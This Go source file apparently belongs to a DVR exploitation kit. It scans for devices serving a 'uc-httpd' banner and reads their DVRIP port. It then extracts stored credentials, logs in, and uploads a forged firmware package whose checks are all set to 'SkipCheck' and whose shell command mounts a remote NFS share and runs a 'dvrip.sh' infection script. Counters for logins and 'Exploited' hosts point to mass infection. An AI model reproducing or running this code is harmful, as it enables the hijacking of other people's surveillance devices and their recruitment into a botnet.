package main

import (
	"archive/zip"
	"bytes"
	"dvr-exploitation-kit/pkg/dvrip"
	"dvr-exploitation-kit/pkg/logging"
	"dvr-exploitation-kit/pkg/stringh"
	"encoding/json"
	"fmt"
	"io"
	"strings"
	"time"
)

func dvripWebExploitFunction(target string) {
	conn, err := dialer.Dial("tcp", target)
	if err != nil {
		return
	}

	defer conn.Close()

	_ = conn.SetDeadline(time.Now().Add(15 * time.Second))
	_, _ = conn.Write([]byte("GET / HTTP/1.1\r\nUser-Agent: Hello World/1.0\r\nHost: " + target + "\r\nAccept: */*\r\n\r\n"))

	// read all the data
	data, err := io.ReadAll(conn)
	if err != nil {
		return
	}

	// banner check
	if !strings.Contains(string(data), "Server: uc-httpd") {
		return
	}

	// get host port
	port, err := stringh.Between(string(data), "var hostport=", ";")
	if err != nil {
		return
	}

	logging.Global.Debug().Str("addr", strings.Split(target, ":")[0]).Str("port", port).Msg("Retrieved host port")

	// actually infect now
	dvripInfectFunction(strings.Split(target, ":")[0] + ":" + port)
}

func createZip() ([]byte, error) {
	var buf bytes.Buffer

	zipWriter := zip.NewWriter(&buf)

	fileWriter, err := zipWriter.Create("InstallDesc")
	if err != nil {
		return nil, err
	}

	var mountCommand = fmt.Sprintf("cd /var; mkdir o; mount -o intr,nolock,tcp,exec %s:%s o; cd o; sh dvrip.sh", MountServers[random.Intn(len(MountServers))], MountPoint)
	var data = map[string]interface{}{
		"UpgradeCommand": []map[string]interface{}{
			{
				"Command": "Shell",
				"Script":  mountCommand,
			},
		},
		"Hardware":          "SkipCheck",
		"Vendor":            "SkipCheck",
		"CRC":               "SkipCheck",
		"CompatibleVersion": -1,
		"SupportFlashType": []map[string]interface{}{
			{"FlashID": "SkipCheck"},
		},
	}

	jsonStr, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}

	if _, err = io.WriteString(fileWriter, string(jsonStr)); err != nil {
		return nil, err
	}

	if err = zipWriter.Close(); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func dvripExploitFunction(target string) {
	conn, err := dialer.Dial("tcp", target)
	if err != nil {
		return
	}

	Connections++

	defer func() {
		_ = conn.Close()

		if Connections > 0 {
			Connections--
		}
	}()

	// wee woo
	user, pass, err := dvrip.RetrieveFirstUser(conn)
	if err != nil {
		return
	}

	Credentials++

	client, err := dvrip.NewConn(conn)
	if err != nil {
		return
	}

	err = client.Login(user, pass)
	if err != nil {
		return
	}

	Logins++

	zipData, err := createZip()
	if err != nil {
		return
	}

	if err = client.Upgrade(zipData); err != nil {
		return
	}

	Exploited++
}
